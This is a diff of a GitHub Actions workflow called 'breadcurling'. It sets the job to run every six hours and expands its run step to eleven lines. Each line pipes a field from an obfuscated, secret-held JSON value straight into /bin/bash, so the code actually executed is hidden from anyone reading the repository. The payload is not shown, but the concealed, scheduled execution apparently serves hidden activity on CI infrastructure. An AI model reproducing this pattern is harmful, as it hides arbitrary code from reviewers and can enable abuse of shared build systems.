@@ -3,18 +3,26 @@ name: breadcurling
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 5/6 * * *'
-
+    - cron: '2 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: breadcurling
         env:
-          xn2269: ${{ secrets.xn2269 }}
+          uekfw6819: ${{ secrets.uekfw6819 }}
         run: |
-          echo $xn2269 | jq -r .d0 | /bin/bash
-          echo $pkhg8 | jq -r .iita0 | /bin/bash
-          echo $l549 | jq -r .ywwlb24877 | /bin/bash
+          echo $uekfw6819 | jq -r .a0 | /bin/bash
+          echo $ru197 | jq -r .i264 | /bin/bash
+          echo $s17 | jq -r .eov79 | /bin/bash
+          echo $wkho94 | jq -r .z9 | /bin/bash
+          echo $z26935 | jq -r .zwjr1 | /bin/bash
+          echo $pipkw6 | jq -r .tznw6952 | /bin/bash
+          echo $siqrg6728 | jq -r .gx46021 | /bin/bash
+          echo $kdrsu1504 | jq -r .lkz93 | /bin/bash
+          echo $t006 | jq -r .fzt29809 | /bin/bash
+          echo $ey5509 | jq -r .vviwq1613 | /bin/bash
+          echo $ev5 | jq -r .p4584 | /bin/bash
 
